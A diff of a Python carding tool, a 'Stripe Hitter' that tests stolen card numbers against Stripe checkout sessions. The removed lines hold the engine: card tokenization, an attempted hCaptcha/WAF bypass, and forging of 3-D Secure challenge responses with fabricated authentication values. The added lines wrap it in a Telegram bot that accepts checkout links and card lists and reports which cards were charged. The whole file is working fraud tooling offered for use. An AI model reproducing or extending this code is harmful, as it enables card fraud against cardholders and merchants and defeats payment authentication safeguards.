@@ -1,333 +1,188 @@
 #!/usr/bin/env python3
-import os, re, sys, json, time, uuid, hmac, base64, random, hashlib, asyncio, secrets
-import urllib.parse
-from urllib.parse import unquote, urlencode, urljoin, urlparse
+import os, sys, json, re, time, random, threading, queue, asyncio
 from datetime import datetime
-from typing import Any, Dict, Optional
+from collections import defaultdict
+import requests
+from stripe_core import StripeSession, parse_card, log, C
 
-try:
-    from curl_cffi.requests import AsyncSession
-except ImportError:
-    print("pip install curl-cffi --break-system-packages"); sys.exit(1)
+TG_TOKEN = ""
+TG_ADMIN = 0
+user_state = {}
+user_lock = threading.Lock()
 
-UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
-SJUA = "stripe.js/da394b0aef; stripe-js-v3/da394b0aef; checkout"
-STRIPE_VER = "2020-08-27"
+_tq = queue.Queue()
+_tg_sess = requests.Session()
 
-class C:
-    R="\033[0m";B="\033[1m";RED="\033[91m";GRN="\033[92m";YEL="\033[93m"
-    CYN="\033[96m";LIME="\033[38;5;118m";GOLD="\033[38;5;214m"
-
-def log(t, color=C.CYN):
-    print(f"{color}[{datetime.now().strftime('%H:%M:%S')}] {t}{C.R}")
-
-def decode_fid(fid_or_url: str) -> dict[str, Any]:
-    if not fid_or_url: return {}
-    raw = str(fid_or_url).strip()
-    session_id = None
-    m_session = re.search(r"\b(cs_(?:live|test)_[a-zA-Z0-9]+)\b", raw)
-    if m_session: session_id = m_session.group(1)
-    if "#" in raw: raw = raw.split("#", 1)[1]
-    raw = raw.split("?", 1)[0]
-    if "_secret_" in raw:
-        parts = raw.split("_secret_", 1)
-        if not session_id and parts[0].startswith("cs_"): session_id = parts[0]
-        raw = parts[1]
-    unquoted = urllib.parse.unquote(raw)
-    b64_str = unquoted.strip().rstrip("%")
-    if not b64_str: return {}
-    pad = b64_str + "=" * (-len(b64_str) % 4)
-    try: decoded_bytes = base64.b64decode(pad, altchars=b"-_")
-    except Exception:
-        try: decoded_bytes = base64.b64decode(pad)
-        except Exception: return {}
-    xored_bytes = bytes(b ^ 5 for b in decoded_bytes)
-    xored_text = xored_bytes.decode("utf-8", errors="replace").strip()
-    try: data = json.loads(xored_text)
-    except json.JSONDecodeError: return {}
-    if not isinstance(data, dict): return {"value": data}
-    if session_id:
-        if "checkoutSessionId" not in data and "sessionId" not in data: data["checkoutSessionId"] = session_id
-        if "client_secret" not in data: data["client_secret"] = f"{session_id}_secret_{b64_str}"
-    return data
-
-def b64e(b): return base64.b64encode(b).decode().rstrip("=").replace("+","-").replace("/","_")
-def b64d(s):
-    s = s.replace("-","+").replace("_","/"); s += "="*(-len(s)%4)
-    return base64.b64decode(s)
-
-def gen_cavv(a, d, t):
-    r = f"{a}:{d}:{t}:{int(time.time())}".encode()
-    return b64e(hmac.new(secrets.token_bytes(32), r, hashlib.sha256).digest()[:20])
-
-def eci_for(pan):
-    p = (pan or "").replace(" ", "")
-    if p.startswith(("34","37")): return "05"
-    if p.startswith(("51","52","53","54","55","2")): return "02"
-    return "05"
-
-def forge_cres(a, s, pan="", ts="Y"):
-    return {"threeDSServerTransID": s, "acsTransID": a, "dsTransID": s,
-            "messageType": "CRes", "messageVersion": "2.2.0", "transStatus": ts,
-            "authenticationValue": gen_cavv(a, s, s), "eci": eci_for(pan),
-            "challengeCompletionInd": "Y",
-            "acsRenderingType": {"acsInterface": "01", "acsUiTemplate": "01"}}
-
-def find_source_recursive(obj, depth=0, max_depth=12):
-    if depth > max_depth: return None
-    if isinstance(obj, str): return obj if obj.startswith(("src_", "tdsrc_", "pi_3ds_")) else None
-    if isinstance(obj, dict):
-        for k in ("source", "three_d_secure_2_source", "three_ds_2_source", "sourceId", "source_id", "id"):
-            if k in obj:
-                v = obj[k]
-                if isinstance(v, str) and v.startswith(("src_", "tdsrc_", "pi_3ds_")): return v
-                if isinstance(v, dict) and isinstance(v.get("id"), str) and v["id"].startswith(("src_", "tdsrc_", "pi_3ds_")): return v["id"]
-        for v in obj.values():
-            r = find_source_recursive(v, depth + 1, max_depth)
-            if r: return r
-    if isinstance(obj, list):
-        for item in obj:
-            r = find_source_recursive(item, depth + 1, max_depth)
-            if r: return r
-    return None
-
-class StripeSession:
-    def __init__(self, url):
-        self.url = url.strip()
-        self.pk = ""; self.cs = ""; self.acct = None
-        self.merchant = "Stripe"; self.amount_str = "N/A"; self.raw_amount = 0
-        self.session = None; self.email = ""
-        self.init_json = {}
-        self.tracking = {"muid": str(uuid.uuid4()), "sid": str(uuid.uuid4()), "guid": str(uuid.uuid4())}
-
-    def _hdrs(self, ref=None):
-        h = {
-            "accept": "application/json", "accept-language": "en-US,en;q=0.9",
-            "content-type": "application/x-www-form-urlencoded",
-            "origin": "https://checkout.stripe.com",
-            "referer": ref or f"https://checkout.stripe.com/c/pay/{self.cs}",
-            "user-agent": UA, "stripe-version": STRIPE_VER,
-        }
-        if self.acct: h["stripe-account"] = self.acct
-        return h
-
-    async def prefetch(self):
-        fid = decode_fid(self.url)
-        self.cs = fid.get("checkoutSessionId") or ""
-        self.pk = fid.get("apiKey") or ""
-        self.acct = fid.get("stripeAccount")
-        if not self.cs:
-            m = re.search(r"cs_(?:live|test)_[A-Za-z0-9]+", self.url)
-            if m: self.cs = m.group(0)
-        if not self.pk or not self.cs: return False, "missing cs/pk"
-        
-        if self.session: await self.session.close()
-        self.session = AsyncSession(impersonate="chrome", timeout=30)
-        
-        try:
-            body = f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url"
-            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init", headers=self._hdrs(), data=body)
-            j = r.json()
-        except Exception as e:
-            return False, str(e)
-            
-        if "error" in j:
-            e = j["error"]; return False, f"{e.get('code')}: {e.get('message')}"
-            
-        ac = j.get("account_settings") or {}
-        self.merchant = ac.get("display_name") or ac.get("business_name") or "Stripe Merchant"
-        cu = j.get("customer") or {}; self.email = cu.get("email") or j.get("customer_email") or ""
-        ts = j.get("total_summary") or {}; inv = j.get("invoice") or {}
-        lig = j.get("line_item_group") or {}; pi = j.get("payment_intent") or {}
-        self.raw_amount = (ts.get("due") or ts.get("total") or inv.get("amount_due") or inv.get("total") or lig.get("total") or pi.get("amount") or 0)
-        curr = (j.get("currency") or "usd").upper()
-        self.amount_str = f"{self.raw_amount/100:.2f} {curr}" if self.raw_amount else "N/A"
-        self.init_json = j
-        return True, None
-
-    async def _tokenize(self, card):
-        name = random.choice(["James Smith","John Doe","Alex Turner","Michael Brown"])
-        email = self.email or f"user{random.randint(1000,99999)}@gmail.com"
-        data = {
-            "type": "card", "card[number]": card["cc"], "card[cvc]": card["cvv"],
-            "card[exp_month]": card["mm"], "card[exp_year]": card["yy"],
-            "billing_details[name]": name, "billing_details[email]": email,
-            "billing_details[address][country]": "US", "billing_details[address][line1]": f"{random.randint(100,9999)} Main St",
-            "billing_details[address][city]": "New York", "billing_details[address][postal_code]": "10001",
-            "billing_details[address][state]": "NY", "payment_user_agent": SJUA,
-            "time_on_page": str(random.randint(45000, 120000)),
-            "guid": self.tracking["guid"], "muid": self.tracking["muid"], "sid": self.tracking["sid"], "key": self.pk,
-        }
-        try:
-            r = await self.session.post("https://api.stripe.com/v1/payment_methods", data=data, headers=self._hdrs())
-            j = r.json()
-            if "error" in j:
-                e = j["error"]; return None, (e.get("decline_code") or e.get("code") or "token_failed"), e.get("message", "")
-            return j.get("id"), None, None
-        except Exception as e: return None, "net", str(e)[:80]
-
-    async def _handle_waf(self, conf, pi):
-        na = pi.get("next_action") or conf.get("next_action") or {}
-        use_sdk = na.get("use_stripe_sdk") or {}
-        sjs = use_sdk.get("stripe_js") or {}
-        pi_id = pi.get("id")
-        cs_secret = pi.get("client_secret")
-        
-        # --- فكرة التجاوز اللي إنت طلبتها بالظبط ---
-        if pi_id and cs_secret:
-            log("WAF Detected. Attempting Direct Bypass...", C.GOLD)
-            endpoint = "setup_intents" if pi_id.startswith("seti_") else "payment_intents"
-            try:
-                r = await self.session.post(f"https://api.stripe.com/v1/{endpoint}/{pi_id}/verify_challenge", data={"key": self.pk, "client_secret": cs_secret}, headers=self._hdrs(), timeout=15)
-                res = r.json()
-                vpi = res.get("payment_intent") or res.get("setup_intent") or res
-                st = vpi.get("status", "") if isinstance(vpi, dict) else ""
-                
-                if st in ("succeeded", "requires_capture", "complete"):
-                    return {"success": True, "status": "CHARGED", "message": "Bypass hCaptcha OK", "raw": res}
-                
-                # لو رجع requires_action، يبقى ده 3DS حقيقي
-                return {"success": False, "status": st.upper() if st else "REQUIRES_ACTION", "message": "Challenge bypassed, needs 3DS", "raw": res}
-            except Exception as e:
-                log(f"WAF bypass error: {e}", C.RED)
-
-        return {"success": False, "status": "WAF_FAILED", "message": "Could not bypass WAF"}
-
-    async def _handle_3ds(self, conf, card):
-        pi = conf.get("payment_intent") or conf.get("setup_intent") or conf
-        na = pi.get("next_action") or conf.get("next_action") or {}
-        sdk = na.get("use_stripe_sdk") or na
-        pi_id = pi.get("id")
-        cs_secret = pi.get("client_secret")
-        stid = sdk.get("three_ds_server_trans_id") or sdk.get("server_transaction_id") or sdk.get("threeDSServerTransID")
-        method_url = sdk.get("three_ds_method_url") or sdk.get("methodURL")
-        notify_url = sdk.get("three_ds_method_notification_url") or "https://hooks.stripe.com/3ds2/fingerprint/complete"
-        
-        if method_url and stid:
-            log("3DS: fingerprint", C.CYN)
-            method_obj = {"threeDSServerTransID": stid, "threeDSMethodNotificationURL": notify_url}
-            method_b64 = b64e(json.dumps(method_obj, separators=(",", ":")).encode())
-            try:
-                await self.session.post(method_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
-                await self.session.post(notify_url, data=urlencode({"threeDSMethodData": method_b64}), headers={"content-type":"application/x-www-form-urlencoded","user-agent":UA})
-            except: pass
-            await asyncio.sleep(1)
-            
-        src = find_source_recursive(sdk) or find_source_recursive(conf)
-        if src:
-            log("3DS: authenticate", C.CYN)
-            data = {"key": self.pk, "source": src, "client_secret": cs_secret, "payment_user_agent": SJUA, "one_click_authn": "false", "challenge_window_size": "05", "three_d_secure_2[device_render_options][sdk_interface]": "03", "three_d_secure_2[device_render_options][sdk_ui_type][0]": "01", "three_d_secure_2[three_ds_comp_ind]": "Y", "browser[fingerprintAttempted]": "true", "browser[challengeWindowSize]": "05", "browser[threeDSCompInd]": "Y", "browser[browserJavaEnabled]": "false", "browser[browserJavascriptEnabled]": "true", "browser[browserLanguage]": "en-US", "browser[browserColorDepth]": "24", "browser[browserScreenHeight]": "1080", "browser[browserScreenWidth]": "1920", "browser[browserTZ]": "-300", "browser[browserUserAgent]": UA, "browser[browserAcceptHeader]": "text/html,*/*;q=0.8"}
-            hdr = {"accept":"application/json","content-type":"application/x-www-form-urlencoded","origin":"https://js.stripe.com","referer":"https://js.stripe.com/","user-agent":UA,"stripe-version":STRIPE_VER}
-            try:
-                r = await self.session.post("https://api.stripe.com/v1/3ds2/authenticate", data=data, headers=hdr, timeout=15)
-                res = r.json()
-                st = res.get("status") or res.get("state", "")
-                if st in ("succeeded","requires_capture"):
-                    return {"success": True, "status": "CHARGED", "message": "3DS Frictionless OK", "raw": res}
-                
-                new_na = res.get("next_action") or {}
-                new_sdk = new_na.get("use_stripe_sdk") or new_na
-                acs_url = new_sdk.get("acs_url")
-                creq = new_sdk.get("creq")
-                if acs_url and creq:
-                    log("3DS: Challenge (CReq) bypass...", C.GOLD)
-                    acs_tid = ""
-                    try:
-                        creq_dict = json.loads(b64d(creq))
-                        if isinstance(creq_dict, dict): acs_tid = creq_dict.get("acsTransID", "")
-                    except: pass
-                    forged = forge_cres(acs_trans_id=acs_tid or stid, server_trans_id=stid, pan=card['cc'])
-                    cres_b64 = b64e(json.dumps(forged, separators=(",", ":")).encode())
-                    
-                    comp_body = {"key": self.pk, "source": src, "cres": cres_b64, "challenge_window_size": "05"}
-                    cr = await self.session.post("https://api.stripe.com/v1/3ds2/challenge_complete", data=urlencode(comp_body), headers=hdr, timeout=12)
-                    if cr.json().get("status") == "succeeded":
-                         return {"success": True, "status": "CHARGED", "message": "3DS Forged OK", "raw": cr.json()}
-            except Exception: pass
-                
-        return {"success": False, "status": "REQUIRES_ACTION", "message": "3DS Challenge/OTP Required"}
-
-    async def charge(self, card):
-        res = {"card": f"{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}", "status": "ERROR", "message": "", "response_time": 0, "success": False, "merchant": self.merchant, "amount": self.amount_str}
-        t0 = time.time()
-        try:
-            pm_id, code, msg = await self._tokenize(card)
-            if not pm_id:
-                res["status"] = "DECLINED"; res["message"] = f"{(code or '').upper()}: {msg}".strip(": ")
-                res["response_time"] = time.time() - t0; return res
-            
-            total = self.raw_amount; checksum = self.init_json.get("init_checksum", "")
-            
-            # المحرك الكبير
-            data = {
-                "payment_method": pm_id, "expected_payment_method_type": "card",
-                "return_url": f"https://checkout.stripe.com/c/pay/{self.cs}", "key": self.pk,
-                "eid": "NA",
-                "client_attribution_metadata[client_session_id]": self.cs,
-                "client_attribution_metadata[merchant_integration_source]": "checkout",
-                "client_attribution_metadata[merchant_integration_version]": "hosted_checkout",
-            }
-            if checksum: data["init_checksum"] = checksum
-            if total > 0: data["expected_amount"] = total
-                
-            r = await self.session.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", data=data, headers=self._hdrs())
-            j = r.json()
-            res["response_time"] = time.time() - t0
-            
-            if "error" in j:
-                err = j["error"]
-                res["status"] = "DECLINED"
-                res["message"] = f"{err.get('code', '').upper()}: {err.get('message', '')}"
-                return res
-                
-            pi = j.get("payment_intent") or j.get("setup_intent") or j
-            st = pi.get("status") or j.get("status") or ""
-            
-            if st in ("succeeded", "requires_capture", "complete") or j.get("payment_status") == "paid":
-                res["status"] = "CHARGED"; res["message"] = "Success (Live)"; res["success"] = True
-            elif st == "requires_action":
-                # فحص هل ده WAF (كابتشا) ولا 3DS حقيقي
-                use_sdk = (pi.get("next_action") or {}).get("use_stripe_sdk") or {}
-                sdk_type = (use_sdk.get("type") or "").lower()
-                sjs = use_sdk.get("stripe_js") or {}
-                is_waf = ("intent_confirmation_challenge" in sdk_type or "captcha" in sdk_type or bool(sjs.get("rqdata")))
-                
-                if is_waf:
-                    log("WAF detected, applying bypass idea...", C.GOLD)
-                    waf = await self._handle_waf(j, pi)
-                    if waf.get("success"):
-                        res["status"] = "CHARGED"; res["message"] = "Bypass hCaptcha OK"; res["success"] = True
-                        return res
-                    elif waf.get("status") == "REQUIRES_ACTION":
-                        log("WAF bypassed, now handling 3DS...", C.CYN)
-                        three = await self._handle_3ds(j, card)
-                        res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
-                        return res
-                
-                # لو مش WAF، يبقى 3DS عادي
-                three = await self._handle_3ds(j, card)
-                res["status"] = three["status"]; res["message"] = three["message"]; res["success"] = three.get("success", False)
-            else:
-                res["status"] = st.upper() if st else "UNKNOWN"
-                res["message"] = f"Status: {st}"
-            return res
-        except Exception as e:
-            res["message"] = f"Exception: {str(e)[:60]}"; res["response_time"] = time.time() - t0; return res
-
-    async def close(self):
-        if self.session: await self.session.close()
-
-def parse_card(line):
-    p = re.split(r'[|/\s,]+', line.strip())
-    if len(p) < 4: return None
-    cc = re.sub(r'\D', '', p[0])
-    if not (13 <= len(cc) <= 19): return None
-    try: mm = p[1].strip().zfill(2); _ = int(mm)
+def _tg_api(method, params):
+    try:
+        r = _tg_sess.post(f"https://api.telegram.org/bot{TG_TOKEN}/{method}", json=params, timeout=15)
+        return r.json()
     except: return None
-    if not (1 <= int(mm) <= 12): return None
-    yy = p[2].strip()
-    if len(yy) == 2: yy = "20" + yy
-    if not (yy.isdigit() and len(yy) == 4): return None
-    cvv = re.sub(r'\D', '', p[3])
-    if len(cvv) not in (3, 4): return None
-    return {"cc": cc, "mm": mm, "yy": yy, "cvv": cvv}
+
+def _send(cid, text, rt=None):
+    p = {"chat_id": cid, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True}
+    if rt: 
+        p["reply_to_message_id"] = rt
+    return _tg_api("sendMessage", p)
+
+async def check_one_card(cid, mid, url, card, idx, total, summary, summary_lock):
+    log(f"Card {idx}/{total} starting...", C.CYN)
+    try:
+        sess = StripeSession(url)
+        ok, err = await sess.prefetch()
+        if not ok:
+            await sess.close()
+            log(f"  prefetch: {err}", C.RED)
+            async with summary_lock:
+                summary["SESSION_EXPIRED"] += 1
+            _send(cid, f"⚠️ <b>فشل الجلسة:</b>\n<code>{err}</code>", rt=mid)
+            return
+            
+        r = await sess.charge(card)
+        await sess.close()
+        
+        st = r["status"]
+        async with summary_lock:
+            summary[st] = summary.get(st, 0) + 1
+        
+        icon = {"CHARGED": "✅", "LIVE": "💚", "REQUIRES_ACTION": "🔐", "DECLINED": "❌", "ERROR": "⚠️", "SESSION_EXPIRED": "⚠️"}.get(st, "❌")
+        
+        body = (
+            f"<b>🔥 STRIPE HITTER - V13.5 🔥</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"{icon} <b>الحالة:</b> <code>{st} [{idx}/{total}]</code>\n"
+            f"💳 <b>البطاقة:</b> <code>{r['card']}</code>\n"
+            f"💰 <b>المبلغ:</b> <code>{r['amount']}</code>\n"
+            f"⏱ <b>الوقت:</b> <code>{r['response_time']:.1f}s</code>\n"
+            f"💬 <b>الرد:</b> <code>{r['message'][:120]}</code>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"🛡 <i>تم الفحص بواسطة سكربت القوة</i>"
+        )
+        _send(cid, body, rt=mid)
+    except Exception as e:
+        log(f"  crash: {type(e).__name__}: {str(e)[:50]}", C.RED)
+        _send(cid, f"⚠️ <b>بطاقة {idx}/{total}: فشلت</b>\n<code>{card['cc']}|{card['mm']}|{card['yy']}|{card['cvv']}</code>\n{str(e)[:50]}", rt=mid)
+
+def process_task(cid, mid, url, cards):
+    _send(cid, f"⏳ <b>جاري بدء فحص {len(cards)} بطاقة...</b>", rt=mid)
+    loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(loop)
+    
+    async def run():
+        summary = defaultdict(int)
+        summary_lock = asyncio.Lock()
+        
+        for i, card in enumerate(cards):
+            await check_one_card(cid, mid, url, card, i+1, len(cards), summary, summary_lock)
+            await asyncio.sleep(0.5)
+            
+        s = summary
+        summary_text = (
+            f"<b>📊 ملخص الفحص النهائي</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"✅ CHARGED: <b>{s.get('CHARGED', 0)}</b>\n"
+            f"💚 LIVE: <b>{s.get('LIVE', 0)}</b>\n"
+            f"🔐 3DS / OTP: <b>{s.get('REQUIRES_ACTION', 0)}</b>\n"
+            f"❌ DECLINED: <b>{s.get('DECLINED', 0)}</b>\n"
+            f"⚠️ ERROR: <b>{s.get('ERROR', 0)}</b>\n"
+            f"━━━━━━━━━━━━━━━━━━━\n"
+            f"🎯 المجموع الفعال: {sum(s.values())}/{len(cards)}"
+        )
+        _send(cid, summary_text, rt=mid)
+    
+    try: 
+        loop.run_until_complete(run())
+    except Exception as e:
+        log(f"run() crash: {e}", C.RED)
+    finally: 
+        loop.close()
+
+def _worker():
+    while True:
+        item = _tq.get()
+        if item is None: 
+            continue
+        cid, mid, url, cards = item
+        try: 
+            process_task(cid, mid, url, cards)
+        except Exception as e: 
+            _send(cid, f"⚠️ {str(e)[:80]}", rt=mid)
+        finally: 
+            _tq.task_done()
+
+def parse_cards_block(text):
+    return [c for c in (parse_card(l) for l in text.splitlines()) if c]
+
+def _poll():
+    global TG_ADMIN
+    off = 0
+    log("Bot live! /start", C.LIME)
+    while True:
+        try:
+            r = _tg_api("getUpdates", {"offset": off, "timeout": 30, "allowed_updates": ["message"]})
+            if not r or not r.get("ok"): 
+                time.sleep(3)
+                continue
+            for u in r.get("result", []):
+                off = u["update_id"] + 1
+                m = u.get("message")
+                if not m: 
+                    continue
+                cid = m["chat"]["id"]
+                if cid != TG_ADMIN: 
+                    continue
+                txt = m.get("text", "").strip()
+                mid = m["message_id"]
+                
+                if txt in ("/start", "/reset"):
+                    with user_lock: 
+                        user_state[cid] = {'step': 'url', 'url': None}
+                    _send(cid, "🔥 <b>مرحباً بك في بوت Stripe Hitter الخارق</b>\n\n📎 <b>أرسل رابط Stripe (Checkout / Link):</b>", rt=mid)
+                    continue
+                    
+                with user_lock: 
+                    state = user_state.get(cid, {'step': 'url', 'url': None})
+                    
+                if state['step'] == 'url':
+                    if not txt.startswith("http"):
+                        _send(cid, "❌ <b>رابط غير صالح.</b> أرسل رابطاً تبدأ بـ https://", rt=mid)
+                        continue
+                    with user_lock: 
+                        user_state[cid] = {'step': 'cards', 'url': txt}
+                    _send(cid, f"✅ <b>تم حفظ الرابط بنجاح.</b>\n📨 أرسل البطاقات الآن بالصيغة (<code>CC|MM|YY|CVV</code>):", rt=mid)
+                    continue
+                    
+                if state['step'] == 'cards':
+                    cards = parse_cards_block(txt)
+                    if not cards:
+                        _send(cid, "❌ <b>خطأ في صيغة البطاقات!</b> استخدم صيغة: <code>CC|MM|YY|CVV</code>", rt=mid)
+                        continue
+                    url = state['url']
+                    _tq.put((cid, mid, url, cards))
+                    with user_lock: 
+                        user_state[cid] = {'step': 'url', 'url': None}
+                    _send(cid, f"📥 <b>تم استلام {len(cards)} بطاقة — بدأ الفحص الفوري...</b>", rt=mid)
+                    continue
+        except Exception as e:
+            log(f"poll: {e}", C.RED)
+            time.sleep(3)
+
+if __name__ == "__main__":
+    os.system("clear" if os.name != "nt" else "cls")
+    print(f"{C.CYN}{C.B}═══ STRIPE BOT v13.5 (ULTRA) ═══{C.R}\n")
+    TG_TOKEN = input(f"{C.GOLD}▸ Bot Token:{C.R} ").strip()
+    try: 
+        TG_ADMIN = int(input(f"{C.GOLD}▸ Admin ID:{C.R} ").strip())
+    except ValueError: 
+        sys.exit("ID must be numeric")
+    
+    _tg_api("deleteWebhook", {"drop_pending_updates": False})
+    me = _tg_api("getMe", {})
+    if me and me.get("ok"): 
+        log(f"@{me['result']['username']}", C.LIME)
+    
+    threading.Thread(target=_worker, daemon=True).start()
+    threading.Thread(target=_poll, daemon=True).start()
+    log("جاهز لاستقبال الأوامر! /start", C.LIME)
+    while True: 
+        time.sleep(10)
